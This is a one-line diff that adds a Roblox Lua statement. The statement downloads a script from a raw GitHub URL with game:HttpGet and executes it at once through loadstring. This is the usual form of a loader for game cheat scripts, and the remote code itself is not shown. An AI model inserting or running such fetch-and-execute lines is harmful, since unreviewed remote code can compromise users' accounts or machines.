@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sraczkq/yung-scripts/refs/heads/main/worsehaystackneedle"))()
